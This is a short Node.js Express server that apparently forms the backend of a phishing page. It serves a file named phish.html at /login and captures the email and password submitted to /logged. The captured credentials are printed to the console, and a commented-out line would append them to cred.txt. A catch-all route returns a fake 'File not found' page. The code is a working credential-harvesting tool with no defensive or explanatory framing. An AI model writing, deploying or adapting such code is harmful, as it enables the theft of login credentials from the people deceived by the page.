const express = require("express");
const app = express();
const fs = require("fs")
app.use(express.urlencoded({extended:false}));
app.use(express.json());
app.get("/login",(req,res)=>{
  res.sendFile("/sdcard/phish.html")
})
app.post("/logged",async(req,res)=>{
  res.send("succes")
  
 let email = await req.body.username
 let  password = await req.body.password
   let txt = `email : ${email}\npassword:${password}\n`
   console.log(txt)
   console.log(req)
 //  fs.appendFileSync("cred.txt",txt,(err)=>{console.log(err)})
//   console.log(txt)
})
app.get("*",(req,res)=>{
  res.send('<h1 style="text-align:center;">File not found </h1>')
  res.send(req.statusCode)
})
app.listen(8010,()=>{console.log("server ready")})